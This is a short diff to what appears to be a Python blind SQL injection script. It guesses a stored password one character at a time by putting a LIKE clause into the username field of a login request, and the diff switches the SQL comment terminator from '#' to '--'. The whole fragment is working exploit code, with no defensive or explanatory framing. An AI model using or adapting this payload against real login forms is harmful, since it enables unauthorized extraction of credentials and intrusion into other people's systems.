@@ -24,7 +24,7 @@ while(i<=passLength):
 		print(i2)
 		password=result+charTab[i2]
 		data = {
-			'username': username+'\' AND '+passwordTableName+' LIKE "'+password+'%"#"',
+			'username': username+'\' AND '+passwordTableName+' LIKE "'+password+'%"--',
 			'password': 'pass'
 		}
 		print(data)
